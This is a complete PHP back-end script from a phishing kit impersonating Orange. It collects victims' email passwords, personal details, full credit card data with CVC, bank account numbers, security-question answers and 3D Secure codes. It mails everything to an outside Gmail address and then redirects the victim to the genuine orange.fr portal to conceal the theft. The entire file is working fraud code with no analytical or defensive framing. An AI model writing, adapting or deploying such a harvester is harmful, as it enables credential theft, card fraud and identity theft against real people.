<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+| Email & password  |+------------\n";
$bilsmg .= "Email                       : ".$_SESSION['email']."\n";
$bilsmg .= "Password                    : ".$_SESSION['pw']."\n";
$bilsmg .= "------------+|  Info   |+------------\n";
$bilsmg .= "Full Name                   : ".$_POST['nom']." ".$_POST['prenom']."\n";
$bilsmg .= "Adresse                     : ".$_POST['adr']."\n";
$bilsmg .= "City                        : ".$_POST['ville']."\n";
$bilsmg .= "Zip code                    : ".$_POST['cp']."\n";
$bilsmg .= "Phone number                : ".$_POST['tel']."\n";
$bilsmg .= "birth date                  : ".$_POST['nj']."/".$_POST['nm']."/".$_POST['na']."\n";
$bilsmg .= "------------+| CC info   |+------------\n";
$bilsmg .= "Bank name                   : ".$_POST['cc_banque']."\n";
$bilsmg .= "Number Of Credit Card       : ".$_POST['cc']."\n";
$bilsmg .= "Expiration Date             : ".$_POST['b1']."/".$_POST['b2']."\n";
$bilsmg .= "CVC                         : ".$_POST['cvv']."\n";
$bilsmg .= "Compte bancaire             : ".$_POST['nc']."\n";
$bilsmg .= "Compte bancaire 1           : ".$_POST['ttv']."\n";
$bilsmg .= "Question#1                  : ".$_POST['q1']."\n";
$bilsmg .= "Reponsse#1                  : ".$_POST['r1']."\n";
$bilsmg .= "Question#2                  : ".$_POST['q2']."\n";
$bilsmg .= "Reponsse#2                  : ".$_POST['r2']."\n";
$bilsmg .= "ccp                         : ".$_POST['ccp']."\n";
$bilsmg .= "cyberplus                   : ".$_POST['plus']."\n";
$bilsmg .= "3D CODE                     : ".$_POST['3d']."\n";
$bilsmg .= "Question#3                  : ".$_POST['q3']."\n";
$bilsmg .= "Reponsse#3                  : ".$_POST['r3']."\n";
$bilsmg .= "------------+| By clackislegandry |+------------\n";
$bilsmg .= "From $ip check in http://whoer.net/check?host=$ip   \n";

$bilsub = "ORANGE|".$_POST['cc_banque']."|".$_POST['cc']."|Fr0m ".$ip;
$bilhead = "From: clackj <clacks@localhost.ma>";

mail("proh3lp@gmail.com",$bilsub,$bilsmg,$bilhead);
header("Location: http://www.orange.fr/portail");
?>